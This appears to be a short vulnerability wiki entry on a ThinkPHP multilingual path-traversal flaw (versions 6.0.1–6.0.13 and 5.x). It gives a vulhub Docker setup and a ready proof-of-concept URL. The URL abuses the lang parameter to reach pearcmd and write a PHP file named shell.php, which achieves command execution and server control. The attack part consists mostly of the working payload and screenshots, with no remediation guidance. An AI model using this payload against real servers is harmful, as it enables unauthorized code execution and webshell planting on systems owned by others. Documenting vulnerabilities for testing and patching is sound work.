# ThinkPHP LoadLangPack lang Any file contains vulnerabilities

## Vulnerability Description

When the Thinkphp program enables multilingual functions, you can pass parameters through get, header, cookie and other locations, use the pearcmd file to enter the command execution and obtain server permissions

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Thinkphp，v6.0.1~v6.0.13，v5.0.x，v5.1.x</span>

## Environment construction

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">docker pull vulhub/thinkphp:6.0.12</span>

## Vulnerability reappears

Main page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1671154096412-bb0dedfd-eb08-4b0c-af16-60a54db8a17d.png)

Verify POC

```php
/public/index.php?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1671154607827-3548f528-c745-4ed1-994a-8aee9850ddee.png)![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1671154706972-596ab1d0-26ce-428b-a54b-b94ddaf4e8ef.png)